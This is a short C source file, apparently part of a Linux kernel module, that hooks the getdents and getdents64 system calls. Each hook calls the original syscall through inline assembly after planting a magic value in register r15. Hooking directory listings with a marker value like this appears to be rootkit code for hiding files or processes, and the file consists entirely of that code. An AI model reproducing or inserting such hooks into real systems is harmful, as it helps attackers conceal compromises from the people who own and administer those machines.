#include "../inc/hook.h"
#include "../inc/util.h"

#include <linux/module.h>

void *_getdents   = NULL;
void *_getdents64 = NULL;

asmlinkage int64_t h_getdents(const struct pt_regs *r) {
  int64_t ret = 0;
  hfind(_getdents, "getdents");

  asm("mov %1, %%r15;"
      "mov %2, %%rdi;"
      "call *%3;"
      "mov %%rax, %0"
      : "=m"(ret)
      : "i"(SHRK_MAGIC_R15), "r"(r), "m"(_getdents)
      : "%r15", "%rdi", "%rax");

  return ret;
}

asmlinkage int64_t h_getdents64(const struct pt_regs *r) {
  int64_t ret = 0;
  hfind(_getdents64, "getdents64");

  asm("mov %1, %%r15;"
      "mov %2, %%rdi;"
      "call *%3;"
      "mov %%rax, %0"
      : "=m"(ret)
      : "i"(SHRK_MAGIC_R15), "r"(r), "m"(_getdents64)
      : "%r15", "%rdi", "%rax");

  return ret;
}
